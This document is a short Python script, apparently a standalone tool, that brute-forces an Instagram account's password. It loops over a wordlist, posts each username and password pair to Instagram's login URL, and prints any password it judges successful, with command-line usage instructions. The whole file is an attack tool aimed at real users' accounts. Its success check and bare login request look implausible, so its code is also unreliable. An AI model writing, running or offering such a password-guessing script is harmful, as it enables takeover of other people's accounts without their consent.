import requests
from bs4 import BeautifulSoup
import sys

def insta_brute_force(username, wordlist):
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            url = f'https://www.instagram.com/accounts/login/'
            data = {
                'username': username,
                'password': password
            }
            response = requests.post(url, data=data)
            soup = BeautifulSoup(response.text, 'html.parser')
            if 'loggedin' in soup.find('form')['action']:
                print(f'[+] Password found: {password}')
                return
        print('[-] Password not found in wordlist')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python insta_brute_force.py <username> <wordlist>')
        sys.exit(1)

    username = sys.argv[1]
    wordlist = sys.argv[2]

    insta_brute_force(username, wordlist)
